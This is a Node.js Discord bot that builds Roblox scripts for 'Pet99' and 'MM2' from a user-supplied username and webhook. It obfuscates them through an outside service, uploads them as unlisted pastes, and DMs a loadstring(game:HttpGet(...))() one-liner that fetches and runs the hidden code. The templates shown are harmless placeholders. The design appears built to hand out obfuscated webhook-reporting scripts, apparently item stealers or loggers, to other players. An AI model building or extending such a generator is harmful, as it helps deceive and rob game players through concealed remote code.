// ======================= bot.js =======================
require("dotenv").config();

const axios = require("axios");

const {
  Client,
  GatewayIntentBits,
  Partials,
  REST,
  Routes,
  SlashCommandBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
  AttachmentBuilder,
} = require("discord.js");

// ---------- CONFIG ----------
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const OBFUSCATOR_URL = process.env.OBFUSCATOR_URL || "https://goofyscator.lua.cz/obfuscate";
const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY;

if (!TOKEN || !CLIENT_ID) {
  console.error("❌ Missing DISCORD_TOKEN or CLIENT_ID in .env");
  process.exit(1);
}

// ---------- TEMPLATE MAP (in-memory, no file paths needed) ----------
// Store templates as strings, or fetch them from a URL/CDN
const TEMPLATES = {
  scriptA: process.env.TEMPLATE_PET99 || `
-- Pet99 Script
local webhook = "%%WEBHOOK%%"
local username = "%%USERNAME%%"
print("Hello " .. username .. " from Pet99!")
`,
  scriptB: process.env.TEMPLATE_MM2 || `
-- MM2 Script
local webhook = "%%WEBHOOK%%"
local username = "%%USERNAME%%"
print("Hello " .. username .. " from MM2!")
`,
};

// ---------- HELPERS ----------
function buildScript(template, u, webhook) {
  const safe = (v) =>
    String(v || "")
      .replace(/\\/g, "\\\\")
      .replace(/"/g, '\\"')
      .replace(/\r?\n/g, "\\n");

  return template
    .replace(/%%USERNAME%%/g, safe(u))
    .replace(/%%WEBHOOK%%/g, safe(webhook));
}

// ---------- PREPROCESSOR (in-memory, no file I/O) ----------
function preprocess(code) {
  // Remove single-line comments
  code = code.replace(/--.*$/gm, "");
  // Collapse multiple blank lines
  code = code.replace(/\n\s*\n/g, "\n");
  return code.trim();
}

// ---------- GOOFYSCATOR (HTTP only, no files, no child process) ----------
async function obfuscateWithGoofyscator(sourceCode) {
  const res = await axios.post(
    OBFUSCATOR_URL,
    { source: sourceCode },
    {
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "GoofyscatorBot/1.0",
      },
      timeout: 30000,
    }
  );

  if (res.data && res.data.obfuscated) return res.data.obfuscated;
  if (res.data && res.data.code) return res.data.code;
  if (res.data && res.data.result) return res.data.result;
  if (typeof res.data === "string") return res.data;

  throw new Error("Unexpected response from obfuscator: " + JSON.stringify(res.data).slice(0, 200));
}

// ---------- PASTEFY ----------
async function uploadToPastefy(script) {
  const res = await axios.post(
    "https://pastefy.app/api/v2/paste",
    {
      content: script,
      title: "Paste-" + Math.random().toString(36).slice(2, 8),
      visibility: "UNLISTED",
    },
    {
      headers: {
        Authorization: `Bearer ${PASTEFY_API_KEY}`,
        "Content-Type": "application/json",
      },
    }
  );
  return res.data.paste.raw_url;
}

// ---------- SCRIPT GENERATION (all in-memory) ----------
async function generateScript(u, webhook, templateKey) {
  const template = TEMPLATES[templateKey];
  if (!template) throw new Error("Invalid template: " + templateKey);

  // 1. Fill template
  const rawScript = buildScript(template, u, webhook);

  // 2. Preprocess (strip comments)
  const cleaned = preprocess(rawScript);

  // 3. Obfuscate with Goofyscator
  const obfuscated = await obfuscateWithGoofyscator(cleaned);

  // 4. Upload to Pastefy
  return uploadToPastefy(obfuscated);
}

// ---------- DISCORD ----------
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages],
  partials: [Partials.Channel],
});

const commands = [
  new SlashCommandBuilder()
    .setName("generate")
    .setDescription("Generate a Roblox script")
    .addStringOption((o) =>
      o
        .setName("script")
        .setDescription("Choose script type")
        .setRequired(true)
        .addChoices(
          { name: "Pet99 Script", value: "scriptA" },
          { name: "MM2 Script", value: "scriptB" }
        )
    )
    .toJSON(),
];

client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "generate") {
    const modal = new ModalBuilder()
      .setCustomId(`gen:${i.options.getString("script")}`)
      .setTitle("Generate Script")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("u")
            .setLabel("Username")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("wh")
            .setLabel("Webhook")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        )
      );
    return i.showModal(modal);
  }

  if (i.isModalSubmit() && i.customId.startsWith("gen:")) {
    await i.deferReply({ ephemeral: true });

    try {
      const templateKey = i.customId.split(":")[1];

      const rawUrl = await generateScript(
        i.fields.getTextInputValue("u"),
        i.fields.getTextInputValue("wh"),
        templateKey
      );

      await i.user.send({
        content: `\`\`\`lua\nloadstring(game:HttpGet("${rawUrl}"))()\n\`\`\``
      });

      await i.editReply("✅ Script generated. Check your DMs.");
    } catch (e) {
      console.error("Generation error:", e);
      const file = new AttachmentBuilder(Buffer.from(String(e.stack || e)), {
        name: "error.txt",
      });
      await i.editReply({
        content: "❌ Failed to generate script.",
        files: [file],
      });
    }
  }
});

// ---------- START ----------
(async () => {
  const rest = new REST({ version: "10" }).setToken(TOKEN);
  await rest.put(
    GUILD_ID
      ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
      : Routes.applicationCommands(CLIENT_ID),
    { body: commands }
  );
  await client.login(TOKEN);
  console.log("✅ Bot started successfully on Railway");
})();
